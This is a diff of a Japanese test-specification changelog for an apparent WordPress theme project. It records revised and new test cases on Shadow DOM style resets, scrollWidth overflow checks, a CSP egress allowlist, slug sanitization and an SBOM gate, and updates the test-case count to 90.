+| 2026-06-20 | TC-066 Shadow DOM 継承プロパティ明示リセット前提化（Codex TL レビュー P2×1 是正 / 9巡目） | TC-066 受入条件 (c) を修正。旧: 「shadow root 内要素の `computed style` にテーマ CSS（`font-family` / `color` 等）が侵入していない（Shadow DOM の CSS encapsulation が機能している）」。新: 「shadow root に明示 host リセット（`:host { all: initial }` 等）が適用され、その結果 shadow 内要素の `computed style` がテーマの継承プロパティを引き継いでいないこと。リセット**なしに** Shadow DOM だけで継承が止まるという誤前提で検証しない」。手順 (5) 直前に「shadow root への `:host { all: initial }` 等の明示リセット適用確認」ステップを追加（旧手順 (5)→(6)、(6)→(7) に繰り下げ）。ADR-026 §mode=static 設計原則に「継承プロパティは host 経由で既定継承される / 完全視覚隔離には明示リセット必須」の事実を追記。ADR-026 TC サマリ表の TC-066 (b) 記述も同方針で更新。TC 採番・件数変更なし（89 件維持）。リセット適用範囲の具体化は CARRY-EMBED-004 (L4 carry) に引き継ぎ。 |
 | 2026-06-15 | L4着手前敵対検証修正 | TC-017 → TC-017a / TC-017b に分割（i18n/RTL gate + sanitize_title 分離単体テスト）。TC-025 受入条件を強化（`sanitize_slug()` `[a-z0-9-]` 正規化・単体テスト必須、ログ化のみ合格不可）。TC-027（SBOM gate / P1）を新設。TC-028（Lighthouse CI render-blocking / consent / P1）新設。TC-029（lp-blueprint 12セクション整合 / P1）新設。TC-030（bridge-profile safe_apply_state / ADR-019準拠 / P1）新設。TC-011 に P0 シナリオ追加（ライセンスサーバ 502 / deny-first / TB-18a 準拠）、優先度を P1 → P0 に昇格。§5 carry テーブルを全面是正: 列に TC 参照列を追加、carry-006/011/012/014/021 を新規追加、carry-013→TC-017b、carry-015→TC-027、carry-017→TC-023a、carry-025→TC-023b に参照修正。§4 P0/P1 リスト整合。 |
+
+| 2026-06-20 | REQ-F-036 是正 / TC-074 scrollWidth 修正 / TC-079 egress 追加（PO 要件意図是正） | **REQ-F-036 (7) 是正**: 「JS 禁止（無条件）」→「JS 性能規律（テーマ本体を重くしない原則 / REQ-NF-001e 準拠 / sandboxed iframe 内 JS は許可）」に方針転換。TC-074 受入条件 (a) の `document.body.scrollWidth` 単独チェックを `Math.max(document.documentElement.scrollWidth, document.body.scrollWidth)` または `document.scrollingElement.scrollWidth` に修正（standards-mode での横溢れ見逃し防止 / TL P2 指摘）。TC-079 を新設（ADR-026 §2 egress 制御 / `connect-src` / `img-src` / `form-action` CSP allowlist 確認 / P1 / TL P1 egress 残指摘対応）。§4 P1 リスト更新（TC-079 追加）。§10 TC 表・P1 リスト・GAP-RT↔TC マッピング・CARRY-EMBED-003 TC 範囲を更新。合計 89 → 90 件。 |
 
 **本ファイルが TC / CAT 件数の正本（2026-06-20 時点）**
 
@@ -343,6 +443,11 @@
   - TC-056〜060: GAP-RT-041 移行 SEO（5 件）
 - TC 系（§9 追加）: TC-061〜TC-065 = **5 件**
   - TC-061〜065: GAP-RT-055 AI 生成コンテンツ開示法規制（ADR-025）（5 件）
-- **合計: 76 件（CAT 9 + TC 67）**
+- TC 系（§10 追加）: TC-066〜TC-073 / TC-079 = **9 件**
+  - TC-066〜073: GAP-RT-058 AI 生成 HTML 埋め込みブロック CSS 隔離 dual-mode（ADR-026）（8 件）
+  - TC-079: ADR-026 egress 制御 / CSP allowlist 確認（1 件 / TC-078 後に採番 skip で TC-079 を使用）
+- TC 系（§11 追加）: TC-074〜TC-078 = **5 件**
+  - TC-074〜078: GAP-RT-057 a11y 新 5 要件（WordPress.org accessibility-ready 2026-05-06 改定）（5 件）
+- **合計: 90 件（CAT 9 + TC 81）**
 
-※ 旧来の「41 件」は 2026-06-15 時点の件数。2026-06-18 追加分 30 件 + 2026-06-20 追加分 5 件を加算し 76 件が正本。
+※ 旧来の「41 件」は 2026-06-15 時点の件数。2026-06-18 追加分 30 件 + 2026-06-20 追加分（§9）5 件 + 2026-06-20 追加分（§10）7 件 + 2026-06-20 ADR-026 framing 修正時追加（TC-073）1 件 + 2026-06-20 §11 追加分（TC-074〜078）5 件を加算し 89 件。本修正（2026-06-20 REQ-F-036 是正対応）で TC-079（egress allowlist）1 件追加し 90 件が正本。
